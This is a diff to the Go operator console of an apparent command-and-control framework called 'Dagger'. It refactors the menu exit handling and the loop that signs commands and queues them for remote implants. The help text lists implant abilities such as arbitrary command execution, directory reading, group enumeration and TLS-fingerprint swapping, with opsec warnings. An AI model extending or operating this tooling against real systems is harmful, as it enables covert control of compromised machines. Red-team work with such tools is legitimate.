@@ -452,7 +452,7 @@ func main() {
 	blue := "\033[34m"
 	reset := "\033[0m"
 
-	for {
+	for true {
 		var input string
 		for {
 			fmt.Printf("\n%sDagger controller home menu \n%s", yellow, reset)
@@ -487,8 +487,10 @@ func main() {
 				}
 				fmt.Printf("%sJitter (High, medium, low) > %s", red, reset)
 				fmt.Scan(&jitter)
+
 				fmt.Printf("%sSleep (In seconds) > %s", red, reset)
 				fmt.Scan(&sleep)
+
 				platform = strings.ToLower(platform)
 				arch = strings.ToLower(arch)
 				name = strings.ToLower(name)
@@ -518,6 +520,9 @@ func main() {
 				fmt.Printf("%sUUID > %s", green, reset)
 				fmt.Scan(&uuid)
 				uuid = strings.ToLower(uuid)
+				if uuid == "exit" {
+					break
+				}
 				// We don't know what to expect for the UUID so we need to look it up and then determine the case
 				_, err := UUID_info(uuid)
 				// We check if it exists and, if not, then we break out of the loop
@@ -531,8 +536,6 @@ func main() {
 				// We should also add a field for the sleep timer so that way we can guess when the implant will check in
 				// Based on the lastCheckIn var
 				switch uuid {
-				case "exit":
-					fmt.Printf("Returning to the controller \n")
 
 				default:
 					res, err := UUID_info(uuid)
@@ -552,11 +555,12 @@ func main() {
 				fmt.Printf("%sKey > %s", green, reset)
 				fmt.Scan(&key)
 				key = strings.ToLower(key)
+				if key == "exit" {
+					break
+				}
 				// Marshal the res into a json struct array then pull out individual elements.
 				// The elements should be UUID and the last check-in time
 				switch key {
-				case "exit":
-					break
 				default:
 					key = strings.ToUpper(key)
 					res, err := dumpDB(key)
@@ -583,7 +587,12 @@ func main() {
 				if uuid == "exit" {
 					break
 				}
-				for {
+				if _, err := UUID_info_func(uuid); err != nil {
+					fmt.Println("UUID doesn't exist")
+					break
+				}
+				det := true
+				for det == true {
 					fmt.Println("'pwd' gets the current working directory ")
 					fmt.Println("'gcu' gets the current user by querying the security context ")
 					fmt.Println("'rc' runs a command through the terminal, this can be anything ")
@@ -594,37 +603,28 @@ func main() {
 					fmt.Println("'fing' followed by a new TLS fingerprint overwrites the one the implant currently uses ")
 					fmt.Println("Use this with the utmost care. If you put in a fingerprint that is invalid or otherwise doesn't work, you will no longer be able to execute commands")
 					fmt.Println("'exit' brings you back to the main menu ")
-					fmt.Printf("%sEnter the command you want executed > %s", red, reset)
+					fmt.Printf("%sCommand > %s", red, reset)
 					reader := bufio.NewReader(os.Stdin)
 					cmd, _ = reader.ReadString('\n')
 					cmd = strings.ToLower(cmd)
-					if cmd == "exit" {
-						break
+					cmd = strings.ReplaceAll(cmd, "\n", "")
+					switch cmd {
+					case "exit":
+						det = false
+					default:
+						sig, err := sign(cmd)
+						if err != nil {
+							fmt.Print(err)
+						}
+						res, err := set(cmd, uuid, sig)
+						if res != 0 || err != nil {
+							fmt.Print(err)
+						}
+						if res == 0 {
+							fmt.Printf("Command set \n")
+						}
 					}
-					if cmd == "" {
-						fmt.Println("'pwd' gets the current working directory ")
-						fmt.Println("'gcu' gets the current user by querying the security context ")
-						fmt.Println("'rc' runs a command through the terminal, this can be anything ")
-						fmt.Println("'rd' reads the supplied directory  ")
-						fmt.Println("'terminal' allows you to run terminal commands - NOT OPSEC SAFE ")
-						fmt.Println("'groups' returns the SID of all local groups the user is in ")
-						fmt.Println("'pid' returns the current process ID ")
-						fmt.Println("'fing' followed by a new TLS fingerprint overwrites the one the implant currently uses ")
-						fmt.Println("Use this with the utmost care. If you put in a fingerprint that is invalid or otherwise doesn't work, you will no longer be able to execute commands")
-						fmt.Println("'exit' brings you back to the main menu ")
-						fmt.Printf("%sEnter the command you want executed > %s", red, reset)
-					}
-					sig, err := sign(cmd)
-					if err != nil {
-						fmt.Print(err)
-					}
-					res, err := set(cmd, uuid, sig)
-					if res != 0 || err != nil {
-						fmt.Print(err)
-					}
-					if res == 0 {
-						fmt.Printf("Command set \n")
-					}
+
 				}
 			case input == "5":
 				var address, port string
